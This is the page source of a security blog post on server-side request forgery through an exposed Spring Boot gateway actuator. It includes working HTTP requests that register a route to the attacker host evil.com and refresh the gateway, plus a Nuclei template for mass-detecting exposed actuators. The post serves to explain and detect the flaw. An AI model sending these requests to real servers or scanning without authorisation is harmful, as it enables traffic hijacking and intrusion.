@@ -1,0 +1,598 @@
+<!DOCTYPE html>
+<html><head>
+<title>SI9INT | &#34;Spring Boot&#34;-Actuators and SSRF</title>
+
+
+
+
+<meta charset="utf-8">
+<meta name="X-UA-Compatible" content="IE=edge">
+<meta name="google-site-verification" content="">
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+<meta content="telephone=no" name="format-detection">
+<meta name="description" content="">
+<meta name="renderer" content="webkit">
+<meta name="theme-color" content="#ffffff">
+
+
+
+<meta property="og:title" content="&#34;Spring Boot&#34;-Actuators and SSRF" />
+<meta property="og:description" content="1. Intro A respective colleague of mine Wyatt Dahlenburg recently described in a blog article how a mis-configured &ldquo;Spring Boot&rdquo; application can be used to create an opportunity for SSRF (Server Side Request Forgery) attacks.
+The &ldquo;Spring Framework&rdquo; is an application framework designed for the Java development platform and commonly used to develop web applications like REST-APIs. The &ldquo;Spring Boot&rdquo; extension provides a &ldquo;ready to run&rdquo; environment which allows creating (standalone) Spring-based applications." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://si9int.sh/posts/spring-boot-ssrf/" />
+<meta property="article:published_time" content="2022-01-01T02:01:58+05:30" />
+<meta property="article:modified_time" content="2022-01-01T02:01:58+05:30" />
+
+
+
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="&#34;Spring Boot&#34;-Actuators and SSRF"/>
+<meta name="twitter:description" content="1. Intro A respective colleague of mine Wyatt Dahlenburg recently described in a blog article how a mis-configured &ldquo;Spring Boot&rdquo; application can be used to create an opportunity for SSRF (Server Side Request Forgery) attacks.
+The &ldquo;Spring Framework&rdquo; is an application framework designed for the Java development platform and commonly used to develop web applications like REST-APIs. The &ldquo;Spring Boot&rdquo; extension provides a &ldquo;ready to run&rdquo; environment which allows creating (standalone) Spring-based applications."/>
+
+
+
+
+
+
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Titillium+Web&display=swap" rel="stylesheet"> 
+
+<link type="text/css" rel="stylesheet" href="/vendor/css/bootstrap.min.css">
+
+
+  
+
+
+
+
+
+
+<link rel="stylesheet" href="https://si9int.sh/scss/journal.min.ebbf8b5be6b2caeb937b7daa14f2e109142c134c51872e35705683b9d732b342.css" integrity="sha256-67&#43;LW&#43;ayyuuTe32qFPLhCRQsE0xRhy41cFaDudcys0I=" media="screen">
+
+
+
+<link rel="stylesheet" href="https://si9int.sh/scss/dark-mode.min.cc95ac8a990c7fd859260dab311bc720abc408ac8a146822f546338f25ea581f.css" integrity="sha256-zJWsipkMf9hZJg2rMRvHIKvECKyKFGgi9UYzjyXqWB8=" media="screen">
+
+
+<script src="/vendor/js/loadCSS.js"></script>
+<script>
+  loadCSS("https://fonts.googleapis.com/css?family=Fira+Mono|Material+Icons");
+</script>
+
+
+
+<link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
+
+
+
+
+
+  <script src="/js/toc.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>console.log("Hello from 'layouts/partials/extended_head.html'")</script>
+
+</head>
+<body>
+    	<div id="app"><div id="sideContainer" class="side-container">
+    
+    <a class="a-block nav-head false" href="https://si9int.sh/">
+    
+        <div class="nav-title">
+            <img src="https://i.imgur.com/QmOoAbR.png" alt="logo" width="130rem">
+        </div>
+        
+    </a>
+
+    <div class="nav-link-list">
+        
+        
+            
+            
+            
+                
+            
+            
+            
+            <a class="a-block nav-link-item active" href="/posts">
+                POSTS
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/categories">
+                CATEGORIES
+            </a>
+            
+        
+            
+            
+            
+            
+            
+            <a class="a-block nav-link-item false" href="/about">
+                ABOUT
+            </a>
+            
+        
+            <div class="loader JS_on">
+        <span class="binary"></span>
+        <span class="binary"></span>
+    </div>
+    </div>
+    <div class="nav-footer">
+        
+
+2X22
+
+    </div>
+    
+</div><div id="extraContainer" class="extra-container">
+    
+    
+    <div class="toc animated-visibility" :class="{ invisible: scrollY <= 140 }">
+        
+        
+        
+        
+        <img src="https://i.imgur.com/CBG3eGO.png" style="max-width: 230px; display: block; margin: 1rem auto; border-radius: 5px;">
+        
+        
+
+
+	<div class="toc-content">
+	
+		
+		
+		
+		
+		
+		<ul>
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#1-intro" onclick="onNavClick(`#1-intro-nav`)" id="1-intro-nav">
+									1. Intro
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#2-the-gateway-actuator" onclick="onNavClick(`#2-the-gateway-actuator-nav`)" id="2-the-gateway-actuator-nav">
+									2. The gateway-Actuator
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#3-mass-detection" onclick="onNavClick(`#3-mass-detection-nav`)" id="3-mass-detection-nav">
+									3. Mass-Detection
+								</a>
+							</li>
+						
+						
+					
+				
+			
+		</ul>
+	</div>
+
+</div>
+    
+    <div class="pagination">
+        <a id="globalBackToTop" class="pagination-action animated-visibility" href="#top" :class="{ invisible: scrollY == 0 }">
+            <i class="material-icons pagination-action-icon">
+                keyboard_arrow_up
+            </i>
+        </a>
+        
+    </div>
+</div>
+<div class="single-column-drawer-container" id="drawer"
+     v-bind:class="{ 'single-column-drawer-container-active': isDrawerOpen }">
+    <div class="drawer-content">
+        <div class="drawer-menu">
+            
+            
+            
+                
+                
+                
+                    
+                
+                
+                
+                <a class="a-block drawer-menu-item active" href="/posts">
+                    POSTS
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/categories">
+                    CATEGORIES
+                </a>
+                
+            
+                
+                
+                
+                
+                
+                <a class="a-block drawer-menu-item false" href="/about">
+                    ABOUT
+                </a>
+                
+            
+            
+            <div class="toc">
+
+
+	<div class="toc-content">
+	
+		
+		
+		
+		
+		
+		<ul>
+			
+				
+				
+					
+						
+						
+						
+						
+							
+								
+									<ul>
+								
+							
+						
+						
+							<li>
+								<a href="#1-intro" onclick="onNavClick(`#1-intro-nav`)" id="1-intro-nav">
+									1. Intro
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#2-the-gateway-actuator" onclick="onNavClick(`#2-the-gateway-actuator-nav`)" id="2-the-gateway-actuator-nav">
+									2. The gateway-Actuator
+								</a>
+							</li>
+						
+						
+					
+				
+			
+				
+				
+					
+						
+						
+						
+						
+						
+							<li>
+								<a href="#3-mass-detection" onclick="onNavClick(`#3-mass-detection-nav`)" id="3-mass-detection-nav">
+									3. Mass-Detection
+								</a>
+							</li>
+						
+						
+					
+				
+			
+		</ul>
+	</div>
+
+</div>
+            
+        </div>
+    </div>
+</div>
+<transition name="fade">
+    <div id="drawer-mask" v-bind:class="{ 'single-column-drawer-mask': mounted }" v-if="isDrawerOpen" v-on:click="toggleDrawer"></div>
+</transition>
+<nav id="navBar" class="navbar sticky-top navbar-light single-column-nav-container">
+    <div id="navBackground" class="nav-background"></div>
+    <div class="container container-narrow nav-content">
+        <button id="nav_dropdown_btn" class="nav-dropdown-toggle" type="button" v-on:click="toggleDrawer">
+            <i class="material-icons">
+                menu
+            </i>
+        </button>
+        <a id="navTitle" class="navbar-brand" href="https://si9int.sh/">
+             <img src="https://i.imgur.com/QmOoAbR.png" alt="logo" width="130rem">
+        </a>
+    </div>
+</nav>
+
+            <div id="content">
+                <div id="streamContainer" class="stream-container">
+
+    <div class="post-list-container post-list-container-shadow">
+        <div class="post">
+            
+            
+            
+                
+            
+
+            <div class="post-head-wrapper-text-only"
+      
+            >
+                <div class="post-title">
+                    &#34;Spring Boot&#34;-Actuators and SSRF
+                    <div class="post-meta">
+                        
+                        <time itemprop="datePublished">
+                            2022-01-01
+                        </time>
+                        
+                        
+                        |
+                            <a href='/categories/web'>Web</a>, <a href='/categories/spring'>Spring</a>
+
+                        
+                        
+                    </div>
+                </div>
+            </div>
+              <HR width="100%" id="EOF" style="margin-top: 14px;">
+            <div class="post-body-wrapper">
+                
+                <div class="post-body" v-pre>
+                
+                    <h2 id="1-intro">1. Intro</h2>
+<p>A respective colleague of mine Wyatt Dahlenburg recently described in a blog article how a mis-configured &ldquo;Spring Boot&rdquo; application can be used to create an opportunity for SSRF (Server Side Request Forgery) attacks.</p>
+<p>The &ldquo;Spring Framework&rdquo; is an application framework designed for the Java development platform and commonly used to develop web applications like REST-APIs. The &ldquo;Spring Boot&rdquo; extension provides a &ldquo;ready to run&rdquo; environment which allows creating (standalone) Spring-based applications. These standalone applications can be extended through a module called <code>spring-boot-actuator</code> to append so called &ldquo;production-ready features&rdquo; via actuators. &ldquo;Actuators&rdquo; are basically providing administrative functionality for controlling the application flow (e.g. downstream) or monitoring specific functional behavior of the application itself.</p>
+<p>An example for a &ldquo;Spring Boot&rdquo; actuator would be the <code>/actuator/health</code> endpoint which returns <code>UP</code> if everything runs as intended. Each of these individual endpoints can be enabled or disabled and exposed over HTTP or JMX (Java Management Extensions; an infrastructure for managing Java applications locally or remotely). Some of these endpoints are exposed by default (e.g. the above described <code>health</code>-actuator), a possibility which can be used by an attacker to produce information disclosure. Since v.2+ &ldquo;Spring Boot&rdquo; discloses enabled actuators when visiting the endpoint <code>/actuator</code>.</p>
+<hr>
+<h2 id="2-the-gateway-actuator">2. The <code>gateway</code>-Actuator</h2>
+<p>In his blog Wyatt Dahlenburg described how he stumbled across an enabled <code>gateway</code>-actuator which allows viewing configured routes of the application if extended with <code>/routes</code> (<code>/actuator/gateway/routes</code>; a direct request results in a HTTP-response of status-code 404).</p>
+<p>Routes allow developers to define conditions how application traffic can be proxied using the gateway application (in this case the &ldquo;Spring Boot&rdquo; application) to downstream applications. These routes can be resolved by different protocols using different URI schemes such as <code>http://</code>, <code>https://</code>, <code>ws://</code> (Web-Socket), <code>wss://</code> (Web-Socket over HTTPS) and <code>lb://</code> (Load Balancer). According to the documentation:</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>HTTP-Method</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>globalfilters</code></td>
+<td>GET</td>
+<td>Displays the list of global filters applied to the routes.</td>
+</tr>
+<tr>
+<td><code>routefilters</code></td>
+<td>GET</td>
+<td>Displays the list of <code>GatewayFilter</code> factories applied to a particular route.</td>
+</tr>
+<tr>
+<td><code>refresh</code></td>
+<td>POST</td>
+<td>Clears the routes cache.</td>
+</tr>
+<tr>
+<td><code>routes</code></td>
+<td>GET</td>
+<td>Displays the list of routes defined in the gateway.</td>
+</tr>
+<tr>
+<td><code>routes/{id}</code></td>
+<td>GET</td>
+<td>Displays information about a particular route.</td>
+</tr>
+<tr>
+<td><code>routes/{id}</code></td>
+<td>POST</td>
+<td>Adds a new route to the gateway.</td>
+</tr>
+<tr>
+<td><code>routes/{id}</code></td>
+<td>DELETE</td>
+<td>Removes an existing route from the gateway.</td>
+</tr>
+</tbody>
+</table>
+<p>Here comes the opportunity of creating a SSRF into play. By sending a HTTP-POST request to the unprotected actuator it is possible to define a new route with the ID &ldquo;new_route&rdquo; which proxify traffic from <code>/new-route</code> to an attacker-controlled domain called <code>evil.com</code> over the HTTP-protocol:</p>
+<pre><code>POST /actuator/gateway/routes/new_route HTTP/1.1
+Host: 127.0.0.1:80
+Connection: close
+Content-Type: application/json
+
+{
+  &quot;predicates&quot;: [
+    {
+      &quot;name&quot;: &quot;Path&quot;,
+      &quot;args&quot;: {
+        &quot;_genkey_0&quot;: &quot;/new_route/**&quot;
+      }
+    }
+  ],
+  &quot;filters&quot;: [
+    {
+      &quot;name&quot;: &quot;RewritePath&quot;,
+      &quot;args&quot;: {
+        &quot;_genkey_0&quot;: &quot;/new_route(?&lt;path&gt;.*)&quot;,
+        &quot;_genkey_1&quot;: &quot;/${path}&quot;
+      }
+    }
+  ],
+  &quot;uri&quot;: &quot;https://evil.com&quot;,
+  &quot;order&quot;: 0
+}
+</code></pre><p>A second HTTP-Post request refreshes the gateway and enables the evil route.</p>
+<pre><code>POST /actuator/gateway/refresh HTTP/1.1
+Host: 127.0.0.1:80
+Content-Type: application/json
+Connection: close
+Content-Length: 230
+
+{
+  &quot;predicate&quot;: &quot;Paths: [/new_route], match trailing slash: true&quot;,
+  &quot;route_id&quot;: &quot;new_route&quot;,
+  &quot;filters&quot;: [
+    &quot;[[RewritePath /new_route(?&lt;path&gt;.*) = /${path}], order = 1]&quot;
+  ],
+  &quot;uri&quot;: &quot;https://evil.com&quot;,
+  &quot;order&quot;: 0
+}
+</code></pre><p>It should be noticed that actuators are only stored in memory. If an administrator detects such behavior an application-restart will be enough to make modifications of the <code>gateway</code>-actuator vanish.</p>
+<hr>
+<h2 id="3-mass-detection">3. Mass-Detection</h2>
+<p>The idea of catching low-hanging fruits through mis-configured &ldquo;Spring Boot&rdquo; actuators led me into the creation of a &ldquo;Nuclei&rdquo;-template:</p>
+<pre><code>id: spring-boot-actuator
+
+info: 
+  name: Spring Boot Actuator
+  description: Detects if a host is deployed via Spring Boot and is using publicly accessible actuators
+  author: SI9INT
+
+requests:
+  - method: GET
+    headers:
+      User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+      Origin: https://google.de
+    path:
+      - &quot;{{BaseURL}}/actuator&quot;
+
+    matchers-condition: and
+    matchers:
+
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - &quot;templated&quot;
+</code></pre><p>Running Nuclei against a German subset of the &ldquo;Majestic Million&rdquo; (<a href="https://majestic.com/reports/majestic-million">https://majestic.com/reports/majestic-million</a>) led to few but interesting results.</p>
+<hr>
+<p>Sources:</p>
+<ul>
+<li><a href="https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/">https://wya.pl/2021/12/20/bring-your-own-ssrf-the-gateway-actuator/</a></li>
+<li><a href="https://www.baeldung.com/java-management-extensions">https://www.baeldung.com/java-management-extensions</a></li>
+<li><a href="https://de.wikipedia.org/wiki/Spring_(Framework)">https://de.wikipedia.org/wiki/Spring_(Framework)</a></li>
+<li><a href="https://spring.io/projects/spring-boot#overview">https://spring.io/projects/spring-boot#overview</a></li>
+<li><a href="https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html">https://docs.spring.io/spring-boot/docs/current/reference/html/actuator.html</a></li>
+</ul>
+
+                    
+                    <HR width="100%" id="EOF">
+		    <p style="color:#777;">Last modified on 2022-01-01</p>
+                    
+                </div>
+            </div>
+            
+            
+            <nav class="post-pagination">
+                
+                
+                <a class="older-posts" href="https://si9int.sh/posts/aws-tackling-ssrf/">
+			Previous
+                </a>
+                
+                                
+                <a class="newer-posts">
+            No newer posts.
+                </a>
+                
+            </nav>
+            <div class="post-comment-wrapper">
+                
+                <p style="opacity: 0.6" align="center">
+                    <small>Comments Disabled.</small>
+                </p>
+                
+            </div>
+        </div>
+    </div>
+
+
+                    </div>
+            </div><div id="single-column-footer">
+
+2X22
+</div>
+            </div>
+    
+    <script src="/js/journal.js"></script>
+    </body>
+</html>
